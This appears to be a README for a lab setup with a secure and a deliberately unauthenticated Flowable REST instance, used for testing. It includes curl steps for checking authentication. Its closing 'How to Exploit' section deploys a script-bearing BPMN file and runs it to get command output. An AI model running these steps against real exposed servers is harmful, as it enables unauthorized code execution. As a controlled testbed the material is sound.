# Setup secure and vulnerable Flowable instances
```bash
docker compose up
```

## Test Secure Instance
The secure instance requires basic authentication (default credentials: `rest-admin:test`):
```bash
# Without credentials — should return 401 Unauthorized
curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/flowable-rest/service/repository/deployments
# Expected: 401

# With credentials — should return 200 OK
curl -v -u rest-admin:test http://localhost:8080/flowable-rest/service/repository/deployments
# Expected: HTTP/1.1 200 with http response contains a json
```

## Test Vulnerable Instance
The vulnerable instance has basic authentication disabled:
```bash
# Without credentials — should return 200 OK (no auth required)
curl -v http://localhost:8081/flowable-rest/service/repository/deployments
# Expected: HTTP/1.1 200 
```

# How to Exploit the Exposed UI (on Vulnerable Instance)
```bash
curl -X POST \
    'http://localhost:8081/flowable-rest/service/repository/deployments' \
    -H 'Content-Type: multipart/form-data' \
    -F 'file=@jsScript.bpmn'

curl -X POST \
    'http://localhost:8081/flowable-rest/service/runtime/process-instances' \
    -H 'Content-Type: application/json' \
    -d '{
    "processDefinitionKey": "jsScriptProcess"
    }'
```
Look for the `"variables":[{"name":"commandOutput","type":"string","value":"` at output of the last command.
